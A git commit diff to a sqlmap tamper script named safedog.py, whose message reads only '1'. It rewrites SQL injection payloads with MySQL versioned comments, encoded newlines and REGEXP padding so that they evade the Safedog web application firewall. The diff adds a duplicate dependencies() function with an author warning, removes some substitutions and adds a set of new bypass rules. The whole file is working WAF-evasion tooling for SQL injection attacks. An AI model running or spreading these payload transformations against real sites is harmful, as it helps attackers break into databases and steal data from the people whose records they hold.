057b5a64d5ef0797bb43762928a52c6b9a9405b5
22 <tequilak@protonmail.com>
2022-07-19 00:23:08 +0800

    1

--- tamper/safedog.py
+++ tamper/safedog.py
@@ -5,12 +5,21 @@ Copyright (c) 2006-2022 sqlmap developers (http://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 import random
+import os
 from lib.core.enums import PRIORITY
 from lib.core.settings import UNICODE_ENCODING
 __priority__ = PRIORITY.LOW
+from lib.core.common import singleTimeWarnMessage
+from lib.core.data import kb
+from lib.core.enums import DBMS
 
 def dependencies():
     pass
+
+
+def dependencies():
+    singleTimeWarnMessage("Bypass safedog by l1b3ri'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))
+
 
 def tamper(payload, **kwargs):
     # chars1 = ['%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0A', '%0B', '%0C', '%0D', '%0E', '%0F',
@@ -21,17 +30,11 @@ def tamper(payload, **kwargs):
     # v = random.choice(chars1)
 
     if payload:
-        payload = payload.replace(" ","/*!*/")
         payload = payload.replace("=","/*!*/=/*!*/")
-        payload = payload.replace("AND","/*!*/AND/*!*/")
-        payload = payload.replace("UNION","union/*!88888cas*/")
         payload = payload.replace('OR', '/*!14400Or*/')
         payload = payload.replace("#","/*!*/#")
         payload = payload.replace("--","/*!*/--")
-        payload = payload.replace("(", "+(")
         payload = payload.replace(".", ".+")
-        payload = payload.replace("SELECT","/*!88888cas*/select")
-        payload = payload.replace("FROM","/*!99999c*//*!99999c*/from")
         payload = payload.replace('DATABASE(','DATABASE/*//--//*/(')
         payload = payload.replace('VERSION(','VERSION/*//--//*/(')
         payload = payload.replace('CURRENT_USER(','CURRENT_USER/*//--//*/(')
@@ -39,13 +42,10 @@ def tamper(payload, **kwargs):
         payload = payload.replace('SESSION_USER(','SESSION_USER/*//--//*/(')
         payload = payload.replace('USER(','USER/*//--//*/(')
         payload = payload.replace('LOAD_FILE(','LOAD_FILE/*//--//*/(')
-        payload = payload.replace('/AS','/--+/*%0aAS--+*/%0a')
-        payload = payload.replace('INFORMATION_SCHEMA','--+/*%0aINFORMATION_SCHEMA--+*/%0a')
         payload = payload.replace("SLEEP","/*%0aSLEEP*/")
         payload = payload.replace("LIKE", "/*!%0alike*/")
         payload = payload.replace("CONCAT", "CONCAT/*%0a*/(")
         payload = payload.replace("GROUP BY", "/*%0aGROUP*/BY")
-        payload = payload.replace("ORDER BY","/*%0aORDER*/BY")
         payload = payload.replace("COUNT","/*%0aCOUNT*/")
         payload = payload.replace("BENCHMARK(", "BENCHMARK/*!%0a(*/")
         payload = payload.replace("EXP", "/*%0aEXP*/")
@@ -56,5 +56,17 @@ def tamper(payload, **kwargs):
         payload = payload.replace("CHR(", "CHR--%0a(")
         payload = payload.replace("WNER", "WNER--%0a")
         payload = payload.replace('super_priv','/*!29440/**/super_priv*/')
+        payload = payload.replace(" ", "/*/****/", 1)
+        payload = payload.replace("1", "/*!4444*/",1)
+        payload = payload.replace("ORDER BY", "REGEXP \"[...%25%23]\"   /*!11444order %0a by*/")
+        payload = payload.replace("union ALL SELECT", "/*!11444union all%0a select*/")
+        payload = payload.replace(" AND", "/*!11444AND*/")
+        payload = payload.replace("(SELECT (CASE", "(/*!11444SELECT*/ %0a (CASE")
+        payload = payload.replace("UNION SELECT","/*!11444union*/  /*REGEXP \"[...%25%23]\"*/  %0a select /*REGEXP \"[...%25%23]\"*/")
+        payload = payload.replace("UNION ALL SELECT", "REGEXP \"[...%0a%23]\" /*!11444union %0a select */ ")
+        payload = payload.replace("()", "(%0a /*!80000aaa*/)")
+        payload = payload.replace(" AS", "/*!11444AS*/")
+        payload = payload.replace("FROM", "/*!11444FROM*/")
+        payload = payload.replace("INFORMATION_SCHEMA", "/*like\"%0a%23\"*/ %0a  INFORMATION_SCHEMA")
 
     return payload
